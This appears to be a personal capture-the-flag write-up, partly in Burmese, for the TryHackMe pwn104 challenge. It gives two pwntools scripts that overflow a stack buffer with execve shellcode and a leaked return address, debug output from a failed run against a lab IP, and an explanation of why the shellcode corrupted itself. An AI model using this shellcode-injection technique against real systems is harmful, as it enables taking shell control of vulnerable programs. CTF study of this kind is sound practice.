
#### pwn104

```
pwndbg> checksec
File:     /home/Jackfruit/cate/learn/binary/stack/tryhackme/pwn104/pwn104-1644300377109.pwn104
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No

```

shell injection ရတော့  shell code inject လုပ်ကြည့်မယ်

```python
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn104-1644300377109.pwn104"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.156.141", 9004)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    p.recvuntil(b"for you at ")
    buffer = p.recvline().decode().strip()
    buffer = int(buffer, 16)
    shellcode = asm(shellcraft.amd64.sh())
    
    

    payload = b"\x90" * (88 -len(shellcode)) + shellcode + p64(buffer)
    p.sendline(payload)

    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```

```
[DEBUG] Using cached assembly output from '/home/Jackfruit/.cache/.pwntools-cache-3.13/asm-cache/99cb4b07dea4b242573197a57eaac16709adb122'
[DEBUG] Sent 0x61 bytes:
    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000020  90 90 90 90  90 90 90 90  6a 68 48 b8  2f 62 69 6e  │····│····│jhH·│/bin│
    00000030  2f 2f 2f 73  50 48 89 e7  68 72 69 01  01 81 34 24  │///s│PH··│hri·│··4$│
    00000040  01 01 01 01  31 f6 56 6a  08 5e 48 01  e6 56 48 89  │····│1·Vj│·^H·│·VH·│
    00000050  e6 31 d2 6a  3b 58 0f 05  80 6e 0d 7a  fc 7f 00 00  │·1·j│;X··│·n·z│····│
    00000060  0a                                                  │·│
    00000061
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[*] Closed connection to 10.49.156.141 port 9004
[*] Got EOF while sending in interactive
                                                                                                                                                             
┌──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn104]
└─$ 

```

` [ Padding ] + [ Shellcode ]  + [ Return Address (Buffer Start) ]`

ဒါမဲ့ အဆင်မပြေဘူး 

အကြောင်းအရင်းက  shell code ကိုယ်တိုင်လည်း stack ကိုသုံးတယ်
code instruction အများစုက `rsp` ကို  အကြောင်းပြုပြီး stack ကိုပြင်နေတယ်
အဲတော့ shell code က rspနဲနီးသွားရင် ကိုယ့်ကိုကိုပြင်မိပြီး ကိုယ့်ကိုကိုယ်ဖျက်ဆီးမိတယ်
Shellcode က `push` instruction ကို execute လုပ်တဲ့အခါ `$rsp` က နိမ့်ဆီကို ဆင်းသွားပြီး Shellcode ကိုယ်တိုင် နင်းမိတယ်
ဆိုတော့ rspနဲ့ဝေးရာ မှာ shell code ထားရမယ်
Buffer Padding နည်းသွားတဲ့သဘောဖြစ်တယ်


here's new script 
```python
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn104-1644300377109.pwn104"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.48.133.26", 9004)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    p.recvuntil(b"for you at ")
    buffer = p.recvline().decode().strip()
    buffer = int(buffer, 16)
    shellcode = asm(shellcraft.amd64.sh())
    ret_addr = p64(buffer + 96) 
    
    # 88 bytes padding + 8 bytes return address + 16 bytes NOP sled + shellcode
    payload = b"\x90" * 88 + ret_addr + b"\x90" * 16 + shellcode
    p.sendline(payload)

    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```
